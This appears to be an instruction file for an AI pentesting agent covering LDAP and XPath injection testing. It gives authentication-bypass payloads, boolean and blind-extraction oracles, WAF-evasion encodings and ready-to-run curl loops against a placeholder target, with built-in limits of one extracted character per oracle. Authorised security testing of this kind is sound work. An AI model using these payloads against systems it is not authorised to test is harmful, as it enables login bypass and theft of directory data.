---
name: ldap_xpath_injection
agent: agent5_injection
description: LDAP filter injection and XPath injection in XML-backed search — boolean oracles, attribute exfiltration canaries, and auth-bypass shapes.
---

# LDAP / XPath Injection

## Purpose

Hunts injection in directory-backed auth (LDAP/Active Directory logins, corporate SSO-adjacent forms) and XML-backed search/filter features (product catalogs, document stores, SOAP-adjacent APIs). These classes are nearly extinct in test plans because nobody looks — but enterprise targets (the user's Dell-class targets) still run LDAP auth and XML search behind modern frontends. Real impact: authentication bypass via filter manipulation, and blind extraction of directory attributes (emails, titles, phone numbers) or XML node contents.

## Division of labor

- **Consumes:** login/search endpoint inventory from `agent2_mapping`, any `LDAP`, `Active Directory`, `sAMAccountName`, XML error, or `XPath` strings from `agent1_recon` stack notes.
- **Produces:** `findings/ldap_xpath_injection.md` — per-endpoint verdict table (LDAP vs XPath sections) with oracle evidence and raw pairs. Finished artifact.

## When to use / when NOT to use

- **Use when:** login forms against corporate directories; search features returning XML or with XML error text; parameters named `filter`, `query`, `search` on Java/.NET enterprise apps; error strings like `LDAP: error code`, `javax.naming`, `XPathExpressionException`, `Saxon`.
- **Skip when (time-pass filter):** the login is pure OAuth/SAML with no local filter (verify by reading the login JS — if it redirects to an IdP immediately, stop); the search is backed by a relational DB already covered by `sqli_context_map`; `*` and `(` are rejected with clean 400s and no differential across three attempts.

## Methodology — LDAP

1. **Baseline the auth flow.** Record exact responses for: valid user/wrong pass, invalid user, empty fields. Note status, body length, timing, error text. Every bypass claim diffs against the wrong-pass response.
2. **Filter-break canary.** Inject `*` as the username. Then `admin*`. Then `*)(uid=*))(|(uid=*`. Look for: changed error text, different response length, or successful auth. `*` alone authenticating or changing the flow = filter injection CONFIRMED at the boolean level.
3. **Classic bypass shapes.** `admin)(&)`, `*)(uid=*))(|(uid=*`, and password field `*` or `x)(uid=*`. Test username and password fields independently — some apps interpolate only one.
4. **Boolean oracle via attribute guessing.** If `admin*` behaves differently from `zzz_no_user_*`, you have an oracle. Confirm one benign attribute exists: `*)(title=*))(|(title=*` vs a nonsense attribute `*)(zz_no_attr_9q=*))(|(zz_no_attr_9q=*`. A differential = attribute-enumeration oracle CONFIRMED — stop after the canary.
5. **Blind extraction canary (one character, then stop).** `admin*)(mail=a*))(|(mail=*` vs `mail=zzz*` — if the `a*` variant differs, the mail attribute starts with "a". Extract ONE character as proof, then stop. Full extraction is a human decision.
6. **Error-message mining.** Feed `(` unbalanced, `*` in odd positions, `\00` null bytes. Capture `LDAP: error code 2 - invalid DN`, `Bad search filter`, or stack traces — they confirm the filter is built from your input and reveal attribute names.
7. **DN injection note.** If a `dn`/`basedn` parameter is user-controlled (rare, high value), test `*)(objectClass=*` as the base — a changed result set = DN context injection.

## Methodology — XPath

8. **Baseline the XML search.** Normal query → record result count/shape. Nonsense query → record empty shape. Note whether errors return XML or JSON — XML errors confirm the XML backend.
9. **Quote-break canary.** Inject `'` then `"`. XPath errors (`Invalid expression`, `XPathExpressionException`, Saxon messages) = injection context CONFIRMED at the syntax level.
10. **Classic bypass shapes.** `' or '1'='1`, `" or "1"="1`, `' or 1=1 or '1'='1`. On a login-over-XML flow, a changed response (logged in, different error, more results) = bypass CONFIRMED — verify with the same session-proof rule as `nosql_injection` step 4.
11. **Boolean oracle.** `' and '1'='1` vs `' and '1'='2` — compare result counts against the nonsense-query baseline. A differential = blind XPath oracle.
12. **Node-exfiltration canary.** `'[contains(name,'a')]`-style probes against a known node (or `//user[contains(username,'a')]` if the schema leaked via errors). One boolean answer as proof, then stop.
13. **Error-based extraction (only if errors are verbose).** `substring()` and `string-length()` probes: `' or string-length(//user[position()=1]/password)=8 or '1'='2` — each true/false answer is one bit. Run the canary (one length check), then stop.
14. **Verdict per endpoint.** CONFIRMED needs bypass-with-proof or oracle-diff 2x. Attribute/schema names learned go into the artifact for `agent9_chaining`.

## Exact commands

LDAP baselines:
```bash
curl -s -o wrong.html -w 'wrong-pass: %{http_code} %{size_download}\n' -X POST '<TARGET>/login' -d 'username=admin&password=wrongpass123'
curl -s -o /dev/null -w 'bad-user:   %{http_code} %{size_download}\n' -X POST '<TARGET>/login' -d 'username=zzz_no_user_9q&password=x'
```

LDAP filter-break canaries:
```bash
for u in 'admin*' '*' '*)(uid=*))(|(uid=*' 'admin)(&)'; do
  echo "=== user: $u ==="
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -X POST '<TARGET>/login' --data-urlencode "username=$u" --data-urlencode 'password=x'
done
```

LDAP attribute oracle canary:
```bash
curl -s -o /dev/null -w 'title=* : %{http_code} %{size_download}\n' -X POST '<TARGET>/login' --data-urlencode 'username=*)(title=*))(|(title=*' --data-urlencode 'password=x'
curl -s -o /dev/null -w 'noattr   : %{http_code} %{size_download}\n' -X POST '<TARGET>/login' --data-urlencode 'username=*)(zz_no_attr_9q=*))(|(zz_no_attr_9q=*' --data-urlencode 'password=x'
```

LDAP error mining:
```bash
curl -s -X POST '<TARGET>/login' --data-urlencode 'username=admin(' --data-urlencode 'password=x' | grep -oiE 'ldap[^<"]{0,60}|bad search filter|invalid dn' | head -5
```

XPath quote-break canary:
```bash
curl -s --get '<TARGET>/search' --data-urlencode "q=x'" | grep -oiE 'xpath[^<"]{0,60}|invalid expression|saxon' | head -3
curl -s --get '<TARGET>/search' --data-urlencode 'q=x" or "1"="1' -o xp1.html -w 'bypass-shape: %{http_code} %{size_download}\n'
curl -s --get '<TARGET>/search' --data-urlencode 'q=zzz_no_match_9q' -o xp0.html -w 'baseline:     %{http_code} %{size_download}\n'
diff xp1.html xp0.html >/dev/null && echo SAME || echo DIFFERENT
```

XPath boolean oracle:
```bash
curl -s --get '<TARGET>/search' --data-urlencode "q=x' and '1'='1" | wc -c
curl -s --get '<TARGET>/search' --data-urlencode "q=x' and '1'='2" | wc -c
```

## Bypass-shape catalog

**LDAP (test username and password independently):**
- `*` — wildcard alone; if it authenticates, the filter is `(uid=*)`-shaped
- `admin*` — prefix wildcard; differential vs `zzz*` = boolean oracle
- `*)(uid=*))(|(uid=*` — classic filter-break closing the injected context
- `admin)(&)` — AND-injection tightening the filter to a known user
- `*)(objectClass=*))(|(objectClass=*` — objectClass variant for directories without uid
- `x)(sAMAccountName=admin` — Active Directory attribute variant
- Blind attribute walk (one canary, then stop): `admin*)(mail=a*))(|(mail=*` → narrow `a*` → `ad*` → …

**XPath (test both quote types):**
- `' or '1'='1` / `" or "1"="1` — classic auth bypass over XML user stores
- `' or 1=1 or '1'='1` — numeric-context variant
- `'] | //user/* | //*['` — union-style node dump shape (document the shape; extract one node name as canary, then stop)
- `x' and string-length(//user[position()=1]/username)=5 and '1'='1` — error-free boolean length oracle
- `x'] | //*[contains(name(),'pass')] | //*['` — node-name discovery via contains()

**Second-order LDAP note:** if the app syncs LDAP attributes into a local profile (common in enterprise SSO), test whether the SYNCED copy is injectable — update your directory attribute (displayName, description) to `*)(uid=*` and watch where it renders.

**WAF tells:** if `(` is stripped but `*` passes, the filter targets LDAP metachars — try URL-encoded `%28` and double-encoded `%2528`; log which decoding stage the backend applies.

## Completion-bias defenses

- [ ] Auth flow baselined (valid/wrong/invalid/empty) before any injection
- [ ] Username AND password fields tested independently for LDAP
- [ ] `*`, wildcard-prefix, and filter-break shapes all tried
- [ ] Attribute oracle canary run with real vs nonsense attribute
- [ ] Blind extraction stopped at one character — no autonomous full dumps
- [ ] LDAP error messages mined for attribute/schema disclosure
- [ ] XPath quote-break tried with both quote types
- [ ] XPath bypass shapes verified with session proof where auth is involved
- [ ] Boolean oracle compared against nonsense-query baseline, not "looks different"
- [ ] `findings/ldap_xpath_injection.md` exists with both sections and raw pairs
- **Review step:** agent10_review must verify (a) bypass claims include the wrong-pass baseline diff, (b) oracle diffs reproduced twice, (c) no more than one canary character/value was extracted per oracle.
- **Nudge prompts:**
  - "Keep going until both fields and both quote types are tested — LDAP bypasses hide in the field you skipped."
  - "One boolean answer is the proof. Do not turn the oracle into an extraction loop."
  - "Do not report done before findings/ldap_xpath_injection.md exists on disk."
- **Finished artifact definition:** `findings/ldap_xpath_injection.md` — LDAP section + XPath section, per-endpoint verdict tables, oracle evidence, raw pairs.

## Evidence standard

- Baseline: wrong-pass response and nonsense-query response saved before probing.
- Reproduction: bypass 2x; oracle differential 2x with swapped patterns (a* vs zzz* both directions).
- Raw evidence: full request/response pairs; error-text excerpts for syntax-level confirmation.
- Verdicts: CONFIRMED (bypass with session proof, or oracle 2x) / INCONCLUSIVE (single differential, needs second run) / NEGATIVE (clean 400s across the ladder, no differential).

## Handoffs

- `agent9_chaining`: consumes CONFIRMED bypasses and learned attribute/schema names — directory-data chains and auth-bypass escalation.
- `agent2_mapping`: receives discovered attribute names to enrich the data model.
- `agent10_review`: consumes `findings/ldap_xpath_injection.md` — verifies extraction stayed at canary level.
